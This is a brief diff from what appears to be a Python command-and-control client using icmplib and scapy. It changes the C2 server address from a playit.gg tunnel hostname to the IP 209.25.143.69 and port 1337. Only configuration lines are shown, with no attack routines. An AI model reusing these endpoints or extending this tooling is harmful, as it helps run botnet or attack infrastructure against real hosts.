@@ -11,8 +11,8 @@ from icmplib import ping as pig
 from scapy.layers.inet import UDP
     
 # IP AND PORT C2 ------------------->
-SQUASHEDC2_ADDRESS  = "hard-appendix.gl.at.ply.gg"
-SQUASHEDC2_PORT     = 47545
+SQUASHEDC2_ADDRESS  = "209.25.143.69"
+SQUASHEDC2_PORT     = 1337
 
 
 # Code -------------------------->
